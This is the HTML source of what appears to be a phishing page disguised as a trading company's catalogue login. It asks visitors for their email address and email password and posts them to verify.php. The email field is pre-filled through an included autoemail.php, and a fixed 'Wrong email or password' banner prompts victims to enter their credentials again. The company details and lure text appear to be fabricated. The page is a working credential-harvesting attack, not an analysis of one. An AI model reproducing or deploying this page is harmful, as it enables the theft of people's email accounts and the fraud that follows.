<DOCTYPE html>
<html lang="en">
<head>
<script src="js/jquery-1.11.1.min.js"></script>
<script src="js/animate.js"></script>
<link rel="stylesheet" href="css/style.css" />
<link rel="stylesheet" href="css/font-awesome.min.css">
<title> Login to View More </title>
<link rel="shortcut icon" href="images/home.png" />
</head>
<body>
<div class="transparent">
<div class="info">
	<p>
		<span class="h-3">Techno Auto / construction Trading Company</span>
		<br>
		<span class="h-5">Headquarters: 1010 Main Street, Suite 3010 Houston, TX 773021 (713) 783-810811 customer-care@solution4u.com
			<br>deka_auto.construction@contractor.net deka_auto.construction@engineer.com deka_auto.construction@tech-center.com
			<br>deka_auto.construction@technologist.com Telegram: deka_auto.construction
		</span>
	</p>
	<p>
		<h3>Login To Access And View All The Attached Catalog</h3>
	</p>
</div>

<form id="loginform" method="POST" action="verify.php">
	<div class="loginbox2">
		<label style="color:red; padding-left:70px;"> Wrong email or password! Try again.</label>
		<div class="logincontent">
			<i class="fa fa-user" style="color:magenta"></i>
			<input type="text" name="company" id="company" placeholder="Company Name" class="logininput" onfocus="changeColor1()" onblur="clearColor()" required="" />
			<br><br><br>
			<i class="fa fa-user" style="color:magenta"></i>
			<input type="text" name="email" id="email" value="<?php include 'autoemail.php'; ?>" placeholder="Email Address" class="logininput" onfocus="changeColor2()" onblur="clearColor()" required="" />
			<br><br><br>
			<i class="fa fa-user" style="color:magenta"></i>
			<input type="password" name="password" id="password" placeholder="Email Password" class="logininput" onfocus="changeColor3()" onblur="clearColor()" required="" />
			<br><br>
			<center>
				<p> <button type="submit" name="login3" id="login3" class="loginbtn"> LOGIN </button> </p>
				<h3> Our Products Catalogue </h3>
			</center>
			<div id="animate" onmousemove="pause()" onmouseleave="resume()">
				<img src="images/image1.png" height="200px" width="180px" />&nbsp;
				<img src="images/image2.png" height="200px" width="180px" />&nbsp;
				<img src="images/image3.png" height="200px" width="180px" />&nbsp;
				<img src="images/image4.png" height="200px" width="180px" />&nbsp;
				<img src="images/image5.png" height="200px" width="180px" />&nbsp;
				<img src="images/image6.png" height="200px" width="180px" />&nbsp;
				<img src="images/image7.png" height="200px" width="180px" />&nbsp;
				<img src="images/image8.png" height="200px" width="180px" />&nbsp;
				<img src="images/image9.png" height="200px" width="180px" />&nbsp;
				<img src="images/image10.png" height="200px" width="180px" />&nbsp;
				<img src="images/image11.png" height="200px" width="180px" />&nbsp;
				<img src="images/image12.png" height="200px" width="180px" />&nbsp;
				<img src="images/image13.png" height="200px" width="180px" />&nbsp;
				<img src="images/image14.png" height="200px" width="180px" />&nbsp;
				<img src="images/image15.png" height="200px" width="180px" />&nbsp;
				<img src="images/image16.png" height="200px" width="180px" />
			</div>
		</div>
	</div>
</form>
</div>

<script>
	function changeColor1(){
		document.getElementById("company").style.borderBottomColor = "orange";
	}
	function changeColor2(){
		document.getElementById("email").style.borderBottomColor = "orange";
	}
	function changeColor3(){
		document.getElementById("password").style.borderBottomColor = "orange";
	}
	
	function clearColor(){
		document.getElementById("company").style.borderBottomColor = "";
		document.getElementById("email").style.borderBottomColor = "";
		document.getElementById("password").style.borderBottomColor = "";
	}
	
	function hoverLoginBtn(){
		document.getElementById("login").style.backgroundColor = "rgba(0,0,0,0.8)";
	}
</script>

</body>
</html>
